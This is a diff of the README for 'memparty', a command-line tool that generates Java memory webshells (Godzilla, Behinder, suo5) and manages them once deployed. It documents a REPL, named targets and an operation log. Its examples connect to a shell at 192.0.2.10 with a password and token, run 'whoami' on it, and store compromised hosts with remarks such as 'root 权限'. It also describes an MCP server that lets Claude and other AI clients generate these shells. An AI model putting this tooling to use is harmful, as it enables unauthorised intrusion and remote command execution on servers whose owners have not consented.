@@ -13,16 +13,19 @@ same HTTP API that powers `party.mem.mk/ui`.
 
 - **Interactive wizard** — run `memparty gen` with no flags and pick server / tool / type / packer
   from live, API-driven menus.
-- **Fully scriptable** — every option is also a flag, so generation is reproducible in CI or scripts.
+- **Fully scriptable** — every option is also a flag, so generation is reproducible in CI or
+  scripts; with `--json` even errors come back as structured JSON (`{"ok":false,"error":...}`).
+- **REPL** — bare `memparty` starts an interactive loop: many commands in one session,
+  with auto-saved target names ready to reuse.
 - **MCP server** — `memparty mcp` exposes generation and config as tools for Claude and other MCP clients.
 - **All endpoints** — memshell generate, probe generate, config listing, class-name parsing, version.
 - **Connection testing** — `memparty connect` verifies a deployed Godzilla / Behinder / suo5 shell
   is alive and the credentials work (echo/handshake round-trip).
 - **Command execution** — `memparty exec` runs a command on a deployed Godzilla / Behinder shell
   and prints its output (real `execCommand` / `Cmd` payload round-trip).
-- **Named targets** — `memparty target save` stores shells in projects (with remark + category),
+- **Named targets** — `memparty save` stores shells in projects (with remark + category),
   then `memparty exec web1/bh9060 --cmd "whoami"` needs no flags at all.
-- **Operation log** — every gen/probe/connect/exec/target operation is appended to
+- **Operation log** — every gen/probe/connect/exec/save/note/remove operation is appended to
   `~/.memparty/operations.jsonl`; `memparty log` queries it by category and target.
 - **Flexible output** — payload to stdout by default, or `-o file` (auto base64-decodes `.class`/`.jar`).
 - **Any backend** — defaults to the public site, override to your self-hosted instance.
@@ -54,8 +57,23 @@ export MEMPARTY_API_URL=http://127.0.0.1:8080
 
 ### Interactive
 
+Bare `memparty` starts a REPL: run any subcommand repeatedly in one process — combined with
+auto-saved named targets, a whole gen → verify → exec session fits in one go:
+
+```text
+memparty> connect -u http://192.0.2.10/shell.jsp -t behinder --header-value my-secret-token
+saved as '192.0.2.10/behinder'
+memparty> exec 192.0.2.10/behinder --cmd whoami
+memparty> list
+memparty> exit
+```
+
+Passing arguments behaves exactly as before (piped/CI bare `memparty` still prints help).
+Inside the REPL: `help` lists commands, `<command> --help` shows examples, `exit`/`quit` leaves.
+The `gen` / `probe` wizards work inside the REPL too:
+
 ```bash
-memparty gen        # wizard for a memory shell
+memparty gen        # wizard for a memory shell (outside the REPL)
 memparty probe      # wizard for a probe shell
 ```
 
@@ -168,29 +186,29 @@ Save a shell once, then reference it by name — no more flag soup. Shells live 
 ```bash
 # save (project is created on the fly; --remark/--category are project-level,
 # --shell-remark describes this one shell)
-memparty target save web1/bh9060 -u http://192.0.2.10:9060/console/service \
+memparty save web1/bh9060 -u http://192.0.2.10:9060/console/service \
   -t behinder --pass rebeyond --header-name User-Agent --header-value my-secret-token \
   --remark "内网测试环境 WebSphere" --category test --shell-remark "root 权限"
 
 # list everything (filter with --category <name>)
-memparty target list
+memparty list
 
 # use: <project>/<shell>, or a bare project name when it holds exactly one shell
 memparty connect web1/bh9060
 memparty exec web1 --cmd "whoami"
 
 # edit project meta or a shell's remark / clean up
-memparty target note web1 --remark "new remark" --category prod
-memparty target note web1/bh9060 --remark "new shell note"
-memparty target remove web1/bh9060   # one shell
-memparty target remove web1          # the whole project
+memparty note web1 --remark "new remark" --category prod
+memparty note web1/bh9060 --remark "new shell note"
+memparty remove web1/bh9060   # one shell
+memparty remove web1          # the whole project
 ```
 
 Explicit flags still override stored values (`memparty exec web1 --cmd id --pass otherpass`).
 
 ### Operation log
 
-Every operation (gen, probe, connect, exec, target save/note/remove) is appended as one JSON
+Every operation (gen, probe, connect, exec, save/note/remove) is appended as one JSON
 line to `~/.memparty/operations.jsonl` — target, outcome, duration, and for exec the command
 plus truncated output. Credentials and payload bytes are never logged.
 
